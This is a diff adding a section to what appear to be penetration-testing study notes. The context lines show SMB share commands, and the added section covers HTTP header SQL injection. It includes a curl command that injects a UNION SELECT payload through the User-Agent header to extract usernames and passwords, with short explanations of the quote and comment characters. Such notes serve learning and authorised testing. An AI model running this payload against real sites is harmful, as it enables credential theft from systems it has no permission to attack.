@@ -40,3 +40,10 @@ Internal:
 External:
 *  ```python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp```
 *  ```smbclient //[IP ADDRESS]/logs -U guest -N``` -> access the contents of the network share
+
+## HTTP Header Injection
+If SQL queries are on the server side and are not sanitised it may lead to SQL onto HTTP headers such as,User-Agent, Referer, or X-Forwarded-For
+
+```curl -H "User-Agent: ' UNION SELECT username, password FROM user; # "http://WEBSITE.COM```
+**#** *is used to comment out the remainder of the SQL query*
+**'** *is used to close the existing string in the SQL query*
